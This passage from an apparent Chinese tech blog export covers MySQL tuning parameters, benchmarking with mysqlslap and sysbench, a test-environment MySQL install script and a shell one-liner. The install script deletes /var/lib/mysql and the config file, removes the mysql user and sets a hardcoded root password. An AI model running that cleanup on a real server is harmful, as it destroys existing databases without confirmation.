<li>对于一个架构来说，不要为了优化而进行变更，如果有变更操作，那么要谨慎行事，重新进行风险评估。</li>
<li>要跟其他部门的同事进行协商，讨论后，在进行处理。</li>
<li>优化行为不是针对于服务的，而是针对于业务的，也就是说，只有在实际投入生产之后，才能看出我们的集群架构中的那些地方需要进行优化。</li>
</ul>
<h3 id="三、优化方向"><a href="#三、优化方向" class="headerlink" title="三、优化方向"></a>三、优化方向</h3><h5 id="数据库优化"><a href="#数据库优化" class="headerlink" title="数据库优化"></a>数据库优化</h5><ul>
<li>从系统方面<ul>
<li>磁盘IO,系统配置  (磁盘类型，io策略，raid类型)</li>
<li>swap分区和内存使用 ()</li>
<li>os内核参数配置</li>
<li>带宽</li>
</ul>
</li>
<li>应用方面<ul>
<li>程序稳定性</li>
<li>应用程序和mysql之间的兼容性</li>
</ul>
</li>
<li>数据库服务方面<ul>
<li>数据库配置</li>
<li>sql语句优化</li>
<li>大型事务的处理</li>
<li>内存配置</li>
<li>数据表的设计</li>
</ul>
</li>
</ul>
<h3 id="四、数据库优化维度"><a href="#四、数据库优化维度" class="headerlink" title="四、数据库优化维度"></a>四、数据库优化维度</h3><p><img src= "/img/loading.gif" data-src="/2019/06/20/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BC%98%E5%8C%96/image-20200821193740034.png" alt="image-20200821193740034"></p>
<ul>
<li><p>七分sql，三分配置</p>
</li>
<li><p>硬件</p>
<ul>
<li>内存</li>
<li>磁盘</li>
<li>带宽</li>
</ul>
</li>
<li><p>系统配置</p>
</li>
</ul>
<p><strong>Cpu方面：</strong></p>
<p>vmstat、sar top、htop、nmon、mpstat；</p>
<p><strong>内存：</strong></p>
<p>free、ps-aux；</p>
<p><strong>IO设备（磁盘、网络）</strong></p>
<p>iostat、ss、netstat、iptraf、iftop、lsof；</p>
<p><strong>vmstat命令说明：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）Procs：r显示有多少进程正在等待CPU时间。b显示处于不可中断的休眠的进程数量。在等待I&#x2F;O。</span><br><span class="line">2）Memory：swpd显示被交换到磁盘的数据块的数量。未被使用的数据块，用户缓冲数据块，用于操作系统的数据块的数量。</span><br><span class="line">3）Swap：操作系统每秒从磁盘上交换到内存和从内存交换到磁盘的数据块的数量。s1和s0最好是0。</span><br><span class="line">4）Io：每秒从设备中读入b1的写入到设备b0的数据块的数量。反映了磁盘I&#x2F;O。</span><br><span class="line">5）System：显示了每秒发生中断的数量（in）和上下文交换（cs）的数量。</span><br><span class="line">6）Cpu：显示用于运行用户代码，系统代码，空闲，等待I&#x2F;O的Cpu时间。</span><br></pre></td></tr></table></figure>

<p><strong>iostat命令说明：</strong></p>
<p>实例命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iostat -dk 1 5</span><br><span class="line">iostat -d -k -x 5 （查看设备使用率（%util）和响应时间（await））</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）tps：该设备每秒的传输次数。“一次传输”意思是“一次I&#x2F;O请求”。多个逻辑请求可能会被合并为“一次I&#x2F;O请求”。</span><br><span class="line">2）iops ：硬件出厂的时候，厂家定义的一个每秒最大的IO次数</span><br><span class="line">3）&quot;一次传输&quot;请求的大小是未知的。</span><br><span class="line">4）kB_read&#x2F;s：每秒从设备（drive expressed）读取的数据量；</span><br><span class="line">5）KB_wrtn&#x2F;s：每秒向设备（drive expressed）写入的数据量；</span><br><span class="line">6）kB_read：读取的总数据量；</span><br><span class="line">7）kB_wrtn：写入的总数量数据量；这些单位都为Kilobytes。</span><br></pre></td></tr></table></figure>



<h3 id="五、优化知识"><a href="#五、优化知识" class="headerlink" title="五、优化知识"></a>五、优化知识</h3><p>Swap 优化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SWAP：</span><br><span class="line">MySQL尽量避免使用swap。</span><br><span class="line">阿里云的服务器中默认swap为0。</span><br><span class="line"></span><br><span class="line">&#x2F;proc&#x2F;sys&#x2F;vm&#x2F;swappiness的内容改成0（临时），&#x2F;etc&#x2F;sysctl. conf上添加vm.swappiness&#x3D;0（永久）</span><br><span class="line">这个参数决定了Linux是倾向于使用swap，还是倾向于释放文件系统cache。在内存紧张的情况下，数值越低越倾向于释放文件系统cache。</span><br><span class="line"></span><br><span class="line">IO ：</span><br><span class="line">raid、no lvm、ext4或xfs、ssd、IO调度策略。</span><br><span class="line"></span><br><span class="line">修改MySQL的配置参数innodb_flush_ method，开启O_DIRECT模式：</span><br><span class="line">这种情况下，InnoDB的buffer pool会直接绕过文件系统cache来访问磁盘，但是redo log依旧会使用文件系统cache。</span><br><span class="line">值得注意的是，Redo log是覆写模式的，即使使用了文件系统的cache，也不会占用太多。</span><br></pre></td></tr></table></figure>



<h5 id="数据库实例优化"><a href="#数据库实例优化" class="headerlink" title="数据库实例优化"></a>数据库实例优化</h5><p>整体优化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">thread_concurrency：# 并发线程数量个数</span><br><span class="line">sort_buffer_size：# 排序缓存</span><br><span class="line">read_buffer_size：# 顺序读取缓存</span><br><span class="line">read_rnd_buffer_size：# 随机读取缓存</span><br><span class="line">key_buffer_size：# 索引缓存</span><br><span class="line">thread_cache_size：# (1G—&gt;8, 2G—&gt;16, 3G—&gt;32, &gt;3G—&gt;64)</span><br></pre></td></tr></table></figure>



<p>连接层优化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">max_connections           # 最大连接数，看交易笔数设置  </span><br><span class="line">max_connect_errors        # 最大错误连接数，能大则大</span><br><span class="line">connect_timeout           # 连接超时</span><br><span class="line">max_user_connections      # 最大用户连接数</span><br><span class="line">skip-name-resolve         # 跳过域名解析</span><br><span class="line">wait_timeout              # 等待超时</span><br><span class="line">back_log                  # 可以在堆栈中的连接数量</span><br></pre></td></tr></table></figure>



<p>innodb 优化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-storage-engine</span><br><span class="line">innodb_buffer_pool_size       # 没有固定大小，50%测试值，看看情况再微调。但是尽量设置不要超过物理内存70%</span><br><span class="line">innodb_file_per_table&#x3D;(1,0)</span><br><span class="line">innodb_flush_log_at_trx_commit&#x3D;(0,1,2) # 1是最安全的，0是性能最高，2折中</span><br><span class="line">binlog_sync</span><br><span class="line">Innodb_flush_method&#x3D;(O_DIRECT, fdatasync)</span><br><span class="line">innodb_log_buffer_size           # 100M以下</span><br><span class="line">innodb_log_file_size               # 100M 以下</span><br><span class="line">innodb_log_files_in_group       # 5个成员以下,一般2-3个够用（iblogfile0-N）</span><br><span class="line">innodb_max_dirty_pages_pct   # 达到百分之75的时候刷写 内存脏页到磁盘。</span><br><span class="line">log_bin</span><br><span class="line">max_binlog_cache_size                     # 可以不设置</span><br><span class="line">max_binlog_size                               # 可以不设置</span><br><span class="line">innodb_additional_mem_pool_size     #小于2G内存的机器，推荐值是20M。32G内存以上100M</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>优化</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库压力测试</title>
    <url>/2018/07/28/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h3><p>1、sysbench<br>sysbench是跨平台的基准测试工具，支持多线程，支持多种数据库；<br>主要包括以下几种测试：<br>cpu性能<br>磁盘io性能<br>调度程序性能<br>内存分配及传输速度<br>POSIX线程性能<br>数据库性能(OLTP基准测试)<br>参考：<a href="https://www.cnblogs.com/kismetv/p/7615738.html#t1" target="_blank" rel="noopener">https://www.cnblogs.com/kismetv/p/7615738.html#t1</a></p>
<p>2、mysqlslap<br>mysqlslap 可以用于模拟服务器的负载，并输出计时信息。其被包含在 MySQL 5.1 的发行包中。<br>测试时，可以指定并发连接数，可以指定 SQL 语句。<br>如果没有指定 SQL 语句，mysqlslap 会自动生成查询 schema 的 SELECT 语句。<br>参考：<a href="https://my.oschina.net/moooofly/blog/152547" target="_blank" rel="noopener">https://my.oschina.net/moooofly/blog/152547</a></p>
<p>3、benchmark suite<br>mysql发行包中提供的工具，可以用于在不同数据库服务器上进行比较测试。它是单线程的，主要用于测试服务器执行查询的速度。结果会显示哪种类型的操作在服务器执行得更快。<br> 这个套件的主要好处是包含了大量预定义的测试，容易使用，所以可以很轻松低用于比较不同存储引擎或者不同配置的性能测试。</p>
<p>4、super smack<br>一款用于Mysql和PostgreSQL的基准测试工具，可以提供压力测试和复杂生成。这是一个复杂而强大的工具，可以模拟多用户访问，可以加载测试数据到数据库，并且支持使用随机数据充填测试表。测试定义在“smack”文件中，smack文件使用一种简单的语法定义测试的客户端表、查询等测试要素。</p>
<p>5、tpcc-mysql<br>TPC-C是专门针对联机交易处理系统（OLTP系统）的规范，一般情况下我们也把这类系统称为业务处理系统。</p>
<p>TPC-C是TPC(Transaction Processing Performance Council)组织发布的一个测试规范，用于模拟测试复杂的在线事务处理系统。其测试结果包括每分钟事务数(tpmC)，以及每事务的成本(Price/tpmC)。</p>
<p>在进行大压力下MySQL的一些行为时经常使用。<br>参考：<a href="https://www.hi-linux.com/posts/38534.html" target="_blank" rel="noopener">https://www.hi-linux.com/posts/38534.html</a></p>
<p>其中，sysbench比mysqlslap更通用、更强大，且更适合Innodb（因为模拟了许多Innodb的IO特性）</p>
<h3 id="2、mysqlslap"><a href="#2、mysqlslap" class="headerlink" title="2、mysqlslap"></a>2、mysqlslap</h3><p>mysqlslap是mysql自带的基准测试工具，优点:查询数据,语法简单,灵活容易使用.该工具可以模拟多个客户端同时并发的向服务器发出查询更新,给出了性能测试数据而且提供了多种引擎的性能比较.msqlslap为mysql性能优化前后提供了直观的验证依据,建议系统运维和DBA人员应该掌握一些常见的压力测试工具,才能准确的掌握线上数据库支撑的用户流量上限及其抗压性等问题。</p>
<p>常用的选项<br>–concurrency　　　　并发数量,多个可以用逗号隔开<br>–engines 　　　　　　要测试的引擎，可以有多个，用分隔符隔开，如–engines=myisam,innodb<br>–iterations 　　　　　要运行这些测试多少次<br>–auto-generate-sql　　　　　　　　用系统自己生成的SQL脚本来测试<br>–auto-generate-sql-load-type　　  要测试的是读还是写还是两者混合的（read,write,update,mixed）<br>–number-of-queries 　　　　　　   总共要运行多少次查询。每个客户运行的查询数量可以用查询总数/并发数来计算<br>–debug-info 　　　　　　　　　　   额外输出CPU以及内存的相关信息<br>–number-int-cols 　　　　　　 　   创建测试表的int型字段数量<br>–number-char-cols　　　　　　    创建测试表的chat型字段数量<br>–create-schema 　　　　　　　　   测试的database<br>–query 自己的SQL　　　　　　　　  脚本执行测试<br>–only-print 　　　　　　　　　　    如果只想打印看看SQL语句是什么，可以用这个选项</p>
<p><strong>mysqlslap的运行有如下3个步骤：</strong></p>
<ol>
<li>创建schema、table、test data 等 （在MySQL中，schema就是database）；</li>
<li>运行负载测试，可以使用多个并发客户端连接；</li>
<li>测试环境清理（删除创建的数据、表等）。</li>
</ol>
<p><strong>实例1</strong><br>说明:测试100个并发线程，测试次数1次，自动生成SQL测试脚本，读、写、更新混合测试，自增长字段，测试引擎为innodb，共运行5000次查询<br><strong>#mysqlslap -h127.0.0.1 -uroot -p123456789 –concurrency=100 –iterations=1 –auto-generate-sql –auto-generate-sql-load-type=mixed –auto-generate-sql-add-autoincrement –engine=innodb –number-of-queries=5000</strong><br>Benchmark<br>Running for engine innodb<br>Average number of seconds to run all queries: 0.351 seconds 　　　　 100个客户端（并发）同时运行这些SQL语句平均要花0.351秒<br>Minimum number of seconds to run all queries: 0.351 seconds<br>Maximum number of seconds to run all queries: 0.351 seconds<br>Number of clients running queries: 100 　　　　　　　　　　　　 总共100个客户端（并发）运行这些sql查询<br>Average number of queries per client:50 　　　　　　　　　　　　每个客户端（并发）平均运行50次查询（对应–concurrency=100，–number-of-queries=5000；5000/100=50）</p>
<h3 id="3、sysbench"><a href="#3、sysbench" class="headerlink" title="3、sysbench"></a>3、sysbench</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysbench是一款压力测试工具，可以测试系统的硬件性能，也可以用来对数据库进行基准测试</span><br><span class="line"></span><br><span class="line"> sysbench支持以下几种测试模式：</span><br><span class="line">1、CPU运算性能</span><br><span class="line">2、磁盘IO性能</span><br><span class="line">3、调度程序性能</span><br><span class="line">4、内存分配及传输速度</span><br><span class="line">5、POSIX线程性能</span><br><span class="line">6、数据库性能(OLTP基准测试)</span><br><span class="line">目前sysbench主要支持 mysql,drizzle,pgsql,oracle 等几种数据库。</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1、安装</span><br><span class="line">[root@localhost ~]# wget https://github.com/akopytov/sysbench/archive/1.0.zip -O "sysbench-1.0.zip"  </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">安装mysql头文件和库文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">[root@localhost ~]<span class="comment"># yum install Percona-XtraDB-Cluster-shared-56.x86_64</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">[root@localhost ~]<span class="comment"># yum install  -y Percona-XtraDB-Cluster-devel-56</span></span></span><br><span class="line">[root@localhost ~]# unzip sysbench-1.0.zip</span><br><span class="line">[root@localhost ~]# cd sysbench-1.0</span><br><span class="line"><span class="meta">#</span><span class="bash">执行autogen.sh用它来生成configure这个文件</span></span><br><span class="line">[root@localhost sysbench-1.0]# ./autogen.sh</span><br><span class="line">[root@localhost sysbench-1.0]# ./configure &amp;&amp; make &amp;&amp; make install   #完成sysbench的安装 ,用于mysql默认的安装路径</span><br><span class="line">[root@localhost sysbench-1.0]#./configure --prefix=/usr/local/sysbench/ --with-mysql --with-mysql-includes=/usr/local/mysql/include --with-mysql-libs=/usr/local/mysql/lib 这个是用于指定mysql安装的路径（如果mysql是默认路径，用第一种）</span><br><span class="line"><span class="meta">#</span><span class="bash">由于是yum安装的mysql，查找mysql的安装路径：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">yum install -y mysql-devel</span></span><br><span class="line"><span class="meta">#</span><span class="bash">mysql_config -<span class="built_in">help</span></span></span><br><span class="line">安装mysql-devel，才能使用mysql_config</span><br><span class="line">当然了，用上面的参数编译的话，就要确保你的 MySQL lib目录下有对应的 so 文件，如果没有，可以自己下载 devel 或者 share 包来安装。</span><br><span class="line">另外，如果想要让 sysbench 支持 pgsql/oracle 的话，就需要在编译的时候加上参数</span><br><span class="line">--with-pgsql</span><br><span class="line">或者</span><br><span class="line">--with-oracle</span><br><span class="line">这2个参数默认是关闭的，只有 MySQL 是默认支持的</span><br><span class="line"></span><br><span class="line">[root@localhost sysbench-1.0]# sysbench cpu --cpu-max-prime=10000 run  #测试安装是否成功</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">2、OLTP测试前准备</span><br><span class="line">初始化测试库环境（总共10个测试表，每个表 100000 条记录，填充随机生成的数据）：</span><br><span class="line">cd /tmp/sysbench-0.4.12-1.1/sysbench</span><br><span class="line">mysqladmin create sbtest</span><br><span class="line"></span><br><span class="line">./sysbench --mysql-host=1.2.3.4 --mysql-port=3317 --mysql-user=tpcc --mysql-password=tpcc \</span><br><span class="line"> --test=tests/db/oltp.lua --oltp_tables_count=10 --oltp-table-size=100000 --rand-init=on prepare</span><br><span class="line">关于这几个参数的解释：</span><br><span class="line">--test=tests/db/oltp.lua 表示调用 tests/db/oltp.lua 脚本进行 oltp 模式测试</span><br><span class="line">--oltp_tables_count=10 表示会生成 10 个测试表</span><br><span class="line">--oltp-table-size=100000 表示每个测试表填充数据量为 100000 </span><br><span class="line">--rand-init=on 表示每个测试表都是用随机数据来填充的</span><br><span class="line">如果在本机，也可以使用 –mysql-socket 指定 socket 文件来连接。加载测试数据时长视数据量而定，若过程比较久需要稍加耐心等待。</span><br><span class="line"></span><br><span class="line">真实测试场景中，数据表建议不低于10个，单表数据量不低于500万行，当然了，要视服务器硬件配置而定。如果是配备了SSD或者PCIE SSD这种高IOPS设备的话，则建议单表数据量最少不低于1亿行。</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">3、进行OLTP测试</span><br><span class="line">在上面初始化数据参数的基础上，再增加一些参数，即可开始进行测试了：</span><br><span class="line"></span><br><span class="line">./sysbench --mysql-host=1.2.3.4. --mysql-port=3306 --mysql-user=tpcc \</span><br><span class="line">--mysql-password=tpcc --test=tests/db/oltp.lua --oltp_tables_count=10 \</span><br><span class="line">--oltp-table-size=10000000 --num-threads=8 --oltp-read-only=off \</span><br><span class="line">--report-interval=10 --rand-type=uniform --max-time=3600 \</span><br><span class="line"> --max-requests=0 --percentile=99 run &gt;&gt; ./log/sysbench_oltpX_8_20140921.log</span><br><span class="line">几个选项稍微解释下</span><br><span class="line">--num-threads=8 表示发起 8个并发连接</span><br><span class="line">--oltp-read-only=off 表示不要进行只读测试，也就是会采用读写混合模式测试</span><br><span class="line">--report-interval=10 表示每10秒输出一次测试进度报告</span><br><span class="line">--rand-type=uniform 表示随机类型为固定模式，其他几个可选随机模式：uniform(固定),gaussian(高斯),special(特定的),pareto(帕累托)</span><br><span class="line">--max-time=120 表示最大执行时长为 120秒</span><br><span class="line">--max-requests=0 表示总请求数为 0，因为上面已经定义了总执行时长，所以总请求数可以设定为 0；也可以只设定总请求数，不设定最大执行时长</span><br><span class="line">--percentile=99 表示设定采样比例，默认是 95%，即丢弃1%的长请求，在剩余的99%里取最大值</span><br><span class="line">即：模拟 对10个表并发OLTP测试，每个表1000万行记录，持续压测时间为 1小时。</span><br><span class="line">真实测试场景中，建议持续压测时长不小于30分钟，否则测试数据可能不具参考意义</span><br><span class="line"></span><br><span class="line">测试结果解读：</span><br><span class="line">sysbench 0.5:  multi-threaded system evaluation benchmark</span><br><span class="line"></span><br><span class="line">Running the test with following options:</span><br><span class="line">Number of threads: 8</span><br><span class="line">Report intermediate results every 10 second(s)</span><br><span class="line">Random number generator seed is 0 and will be ignored</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Threads started!</span><br><span class="line">-- 每10秒钟报告一次测试结果，tps、每秒读、每秒写、99%以上的响应时长统计</span><br><span class="line">[  10s] threads: 8, tps: 1111.51, reads/s: 15568.42, writes/s: 4446.13, response time: 9.95ms (99%)</span><br><span class="line">[  20s] threads: 8, tps: 1121.90, reads/s: 15709.62, writes/s: 4487.80, response time: 9.78ms (99%)</span><br><span class="line">[  30s] threads: 8, tps: 1120.00, reads/s: 15679.10, writes/s: 4480.20, response time: 9.84ms (99%)</span><br><span class="line">[  40s] threads: 8, tps: 1114.20, reads/s: 15599.39, writes/s: 4456.30, response time: 9.90ms (99%)</span><br><span class="line">[  50s] threads: 8, tps: 1114.00, reads/s: 15593.60, writes/s: 4456.70, response time: 9.84ms (99%)</span><br><span class="line">[  60s] threads: 8, tps: 1119.30, reads/s: 15671.60, writes/s: 4476.50, response time: 9.99ms (99%)</span><br><span class="line">OLTP test statistics:</span><br><span class="line">    queries performed:</span><br><span class="line">        read:                            938224    -- 读总数</span><br><span class="line">        write:                           268064    -- 写总数</span><br><span class="line">        other:                           134032    -- 其他操作总数(SELECT、INSERT、UPDATE、DELETE之外的操作，例如COMMIT等)</span><br><span class="line">        total:                           1340320    -- 全部总数</span><br><span class="line">    transactions:                        67016  (1116.83 per sec.)    -- 总事务数(每秒事务数)</span><br><span class="line">    deadlocks:                           0      (0.00 per sec.)    -- 发生死锁总数</span><br><span class="line">    read/write requests:                 1206288 (20103.01 per sec.)    -- 读写总数(每秒读写次数)</span><br><span class="line">    other operations:                    134032 (2233.67 per sec.)    -- 其他操作总数(每秒其他操作次数)</span><br><span class="line"></span><br><span class="line">General statistics:    -- 一些统计结果</span><br><span class="line">    total time:                          60.0053s    -- 总耗时</span><br><span class="line">    total number of events:              67016    -- 共发生多少事务数</span><br><span class="line">    total time taken by event execution: 479.8171s    -- 所有事务耗时相加(不考虑并行因素)</span><br><span class="line">    response time:    -- 响应时长统计</span><br><span class="line">         min:                                  4.27ms    -- 最小耗时</span><br><span class="line">         avg:                                  7.16ms    -- 平均耗时</span><br><span class="line">         max:                                 13.80ms    -- 最长耗时</span><br><span class="line">         approx.  99 percentile:               9.88ms    -- 超过99%平均耗时</span><br><span class="line"></span><br><span class="line">Threads fairness:</span><br><span class="line">    events (avg/stddev):           8377.0000/44.33</span><br><span class="line">    execution time (avg/stddev):   59.9771/0.00</span><br><span class="line"></span><br><span class="line">其他信息可以参考这个连接：</span><br><span class="line">http://www.linuxidc.com/Linux/2017-04/142856.htm</span><br><span class="line"></span><br><span class="line">实时操作：</span><br><span class="line">/usr/local/bin/sysbench oltp_common --mysql-host=10.1.18.74 --mysql-port=3306  --table-size=1000000 --db-driver=mysql --mysql-db=test --mysql-user=root--mysql-password=root prepare  此命令用来生成表</span><br><span class="line">oltp_common #生成库的脚本</span><br><span class="line">--mysql-db=test#指定库</span><br><span class="line">prepare   #运行的命令</span><br><span class="line">--oltp_tables_count=10  用来指定生成多少张表</span><br><span class="line"></span><br><span class="line">/usr/local/bin/sysbench  oltp_read_only --mysql-host=10.1.18.74 --mysql-port=3306  --table-size=1000 --db-driver=mysql --mysql-db=test --mysql-user=root --mysql-password=root --time=10 --max-requests=0 --threads=8 run  这是运行</span><br><span class="line"> oltp_read_only #指定只读脚本</span><br><span class="line">--mysql-db=test #指定运行的库</span><br><span class="line">--threads=8 #指定并发连接数</span><br><span class="line">run #运行指令</span><br><span class="line"></span><br><span class="line">/usr/local/bin/sysbench oltp_write_only --mysql-host=10.1.18.74 --mysql-port=3306 --table-size=1000 --db-driver=mysql --mysql-db=test --mysql-user=hairong.cao --mysql-password=hairong.cao --time=10 --max-requests=0 --threads=8 run</span><br><span class="line"></span><br><span class="line">oltp_write_only #指定只写脚本</span><br><span class="line"></span><br><span class="line">生成表：</span><br><span class="line"></span><br><span class="line">/usr/local/bin/sysbench tests/include/oltp_legacy/oltp.lua --mysql-host=10.1.18.74 --mysql-port=3306  --oltp_tables_count=8 --table-size=10000000 --db-driver=mysql --mysql-db=test --mysql-user=hairong.cao --mysql-password=hairong.cao prepare </span><br><span class="line"></span><br><span class="line">混合场景压测：</span><br><span class="line"></span><br><span class="line">/usr/local/bin/sysbench  tests/include/oltp_legacy/oltp.lua  --mysql-host=10.1.18.74 --mysql-port=3306  --table-size=10000000 --db-driver=mysql --mysql-db=test --mysql-user=root --mysql-password=root --oltp_tables_count=8 --max-requests=0 --threads=32 --oltp-read-olny=off --report-interval=10 --percentile=99 --max-time=3600 run &gt;&gt; ./logs/baidu.log  </span><br><span class="line"></span><br><span class="line">cpu测试：</span><br><span class="line"></span><br><span class="line">/usr/local/bin/sysbench --test=cpu --num-threads=40 --max-requests=10000 --cpu-max-prime=20000 run</span><br><span class="line"></span><br><span class="line">IO测试：</span><br><span class="line"></span><br><span class="line">生成测试文件； /usr/local/bin/sysbench --test=fileio --file-num=10 --file-total-size=5G prepare  表示生成10个5G的文件</span><br><span class="line"></span><br><span class="line">运行测试： /usr/local/bin/sysbench --test=fileio --file-total-size=5G --file-test-mode=rndrw  --max-requests=5000 --num-threads=16  --file-num=10 --file-extra-flags=direct --file-fsync-freq=0 --file-block-size=16384 run</span><br><span class="line"></span><br><span class="line">参数说明： --max-requests=5000 表示5000请求量   </span><br><span class="line"></span><br><span class="line">　　　　　　 --num-threads=16  16个线程</span><br><span class="line"></span><br><span class="line">File operations:</span><br><span class="line">reads/s: 1791.40   表示每秒读的次数</span><br><span class="line">writes/s: 1188.31  表示每秒写的次数</span><br><span class="line">fsyncs/s: 5.96   表示每秒从内存向磁盘同步的次数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Throughput:</span><br><span class="line">read, MiB/s: 27.99   这里表示读的带宽</span><br><span class="line">written, MiB/s: 18.57  这里表示写的带宽</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>压力测试</tag>
      </tags>
  </entry>
  <entry>
    <title>测试环境-Yum安装各版本Mysql脚本</title>
    <url>/2018/09/28/%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83-Yum%E5%AE%89%E8%A3%85%E5%90%84%E7%89%88%E6%9C%ACMysql%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> time 2019-09-28</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> lv 2.0</span></span><br><span class="line">echo -e "\033[5;31m警告，此脚本切勿用于生产环境，如有问题，^c退出脚本安装 \033[0m"</span><br><span class="line">sleep 5</span><br><span class="line">echo "此脚本用于yum 安装mysql"</span><br><span class="line">if [[ $UID -ne 0 ]];then</span><br><span class="line">	echo "使用root 执行此脚本"</span><br><span class="line">	exit 1</span><br><span class="line">fi</span><br><span class="line">if [[ $# != 1 ]];then</span><br><span class="line">	echo "Usage script (5.5|5.6|5.7|8.0)"</span><br><span class="line">	exit 123</span><br><span class="line">fi</span><br><span class="line">echo "清理环境"</span><br><span class="line">systemctl stop mysqld mariadb &amp;&gt;/dev/null</span><br><span class="line">yum erase -y `rpm -qa |grep mariadb` 2&gt;/dev/null</span><br><span class="line">yum erase -y `rpm -qa |grep mysql`  2&gt;/dev/null</span><br><span class="line">rm -rvf /etc/my.cnf /var/lib/mysql</span><br><span class="line">userdel -rf mysql &amp;&gt;/dev/null</span><br><span class="line">ping -c1 -w1 www.baidu.com &amp;&gt;/dev/null</span><br><span class="line">if [[ $? -eq 0 ]];then</span><br><span class="line">	yum install -y wget yum-utils &amp;&gt;/dev/null</span><br><span class="line">	if [[ $? -ne 0 ]];then</span><br><span class="line">		echo "yum 配置错误"</span><br><span class="line">		exit 110</span><br><span class="line">	fi</span><br><span class="line">	yum install -y https://dev.mysql.com/get/mysql80-community-release-el7-1.noarch.rpm</span><br><span class="line">	yum clean all</span><br><span class="line">	yum makecache fast</span><br><span class="line">else</span><br><span class="line">	echo "网络错误"</span><br><span class="line">	exit 22</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">5.5)</span><br><span class="line">    yum-config-manager  --disable mysql80-community</span><br><span class="line">    yum-config-manager  --enable mysql55-community</span><br><span class="line">;;</span><br><span class="line">5.6)</span><br><span class="line">	yum-config-manager  --disable mysql80-community</span><br><span class="line">	yum-config-manager  --enable mysql56-community</span><br><span class="line">;;</span><br><span class="line">5.7)</span><br><span class="line">	yum-config-manager  --disable mysql80-community</span><br><span class="line">	yum-config-manager  --enable mysql57-community</span><br><span class="line">;;</span><br><span class="line">8.0)</span><br><span class="line">	:</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">	yum repolist all |grep mysql</span><br><span class="line">	echo "其他版本可自行选择下载并配置"</span><br><span class="line">	exit 13</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line">sleep 2</span><br><span class="line">yum -y install mysql-community-server</span><br><span class="line">systemctl start mysqld</span><br><span class="line">if [[ $? -eq 0 ]];then</span><br><span class="line">	echo "启动成功，初始密码如下(mysql5.7前版本没有初始密码)"</span><br><span class="line">grep -o 'root@localhost.*' /var/log/mysqld.log </span><br><span class="line">mysql_passwd=$(grep "password is generated" /var/log/mysqld.log | awk '&#123;print $NF&#125;' |awk 'END&#123;print&#125;')</span><br><span class="line">/usr/bin/mysqladmin -uroot -p$&#123;mysql_passwd&#125; password 'QianFeng@123' &amp;&gt;/dev/null</span><br><span class="line">echo "mysql原密码:$&#123;mysql_passwd&#125;,\nmysql新密码:QianFeng@123"</span><br><span class="line">echo "安装完成"</span><br><span class="line">else</span><br><span class="line">	echo "mysql启动失败，请手动检查"</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Shell脚本</category>
      </categories>
      <tags>
        <tag>Shell脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>用一行Shell命令，搞定九九乘法表！</title>
    <url>/2020/06/03/%E7%94%A8%E4%B8%80%E8%A1%8CShell%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%90%9E%E5%AE%9A%E4%B9%9D%E4%B9%9D%E4%B9%98%E6%B3%95%E8%A1%A8%EF%BC%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="用一行Shell命令，搞定九九乘法表！"><a href="#用一行Shell命令，搞定九九乘法表！" class="headerlink" title="用一行Shell命令，搞定九九乘法表！"></a>用一行Shell命令，搞定九九乘法表！</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@test ~]# seq 9 | sed 'H;g' | awk -v RS='' '&#123;for(i=1;i&lt;=NF;i++)printf("%dx%d=%d%s", i, NR, i*NR, i==NR?"\n":"\t")&#125;'</span><br><span class="line">1x1=1</span><br><span class="line">1x2=2   2x2=4</span><br><span class="line">1x3=3   2x3=6   3x3=9</span><br><span class="line">1x4=4   2x4=8   3x4=12  4x4=16</span><br><span class="line">1x5=5   2x5=10  3x5=15  4x5=20  5x5=25</span><br><span class="line">1x6=6   2x6=12  3x6=18  4x6=24  5x6=30  6x6=36</span><br><span class="line">1x7=7   2x7=14  